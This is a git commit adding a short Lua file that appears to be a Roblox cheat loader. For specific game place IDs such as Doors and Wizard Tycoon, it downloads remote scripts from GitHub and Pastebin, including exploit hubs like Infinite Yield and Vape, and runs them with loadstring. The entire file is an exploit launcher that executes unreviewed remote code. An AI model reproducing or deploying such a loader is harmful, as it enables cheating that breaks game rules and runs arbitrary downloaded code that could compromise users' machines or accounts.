c88d4dc1dd54194deed676eeff3b1f7757d64fb7
GMDMachine <c1vsbw7@gmail.com>
2023-02-22 09:50:49 +0900

    loadstring

---
+++ LoadString_1.0.lua
@@ -0,0 +1,21 @@
+if game.PlaceId == 6839171747 then --doors ingame
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Loader.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OminousVibes-Exploit/Scripts/main/doors/loadstring.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ISJ0629/scripts/master/scripts/DOORS/doors.txt"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end
+if game.PlaceId == 6516141723 then -- doors lobby
+    loadstring(game:HttpGet("https://pastebin.com/raw/exhYJ1d1"))()
+end
+if game.PlaceId == 11040063484 then -- sword fighting sim
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/accountnop/Insight/script/SFS.lua"))()
+end
+if game.PlaceId == 281489669 then --wizard tycoon
+    loadstring(game:HttpGet("https://pastebin.com/raw/euFigAv1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end
+if game.PlaceId == 6236529295 then --
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end
+--loadstring(game:HttpGet("https://pastebin.com/yVdXMaFy"))() --재접 스크립트
